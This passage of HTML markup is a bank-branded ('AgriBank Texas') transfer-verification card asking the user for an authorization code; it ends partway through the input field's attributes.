       <!-- AUTHORIZATION STEP -->
<div id="auth-step" class="form-card hidden authorization-card">

  <div class="authorization-brand">
    <img
      src="/images/agribank-logo.png"
      alt="AgriBank Texas"
      class="authorization-logo"
    >
  </div>

  <div class="authorization-icon" aria-hidden="true">
    <svg viewBox="0 0 48 48" fill="none">
      <path
        d="M24 4L40 10V22C40 32 33 39 24 44C15 39 8 32 8 22V10L24 4Z"
        stroke="currentColor"
        stroke-width="2.5"
        stroke-linejoin="round"
      />
      <path
        d="M16 24L21 29L32 18"
        stroke="currentColor"
        stroke-width="2.5"
        stroke-linecap="round"
        stroke-linejoin="round"
      />
    </svg>
  </div>

  <div class="authorization-eyebrow">Secure transfer verification</div>

  <h2 class="form-heading">Authorization Required</h2>

  <p class="form-description">
    Continue only with an authorization code issued through your bank's verified security process.
  </p>

  <div
    id="authorization-status"
    class="authorization-status"
    role="status"
    aria-live="polite"
    hidden
  ></div>

  <div class="form-group">
    <label class="form-label" for="auth-code">
      Authorization Code
    </label>

    <input
      id="auth-code"
      type="password"
      class="form-input authorization-code-input"
      placeholder="Enter your authorization code"
      maxlength="12"
      autocomplete="one-time-code"
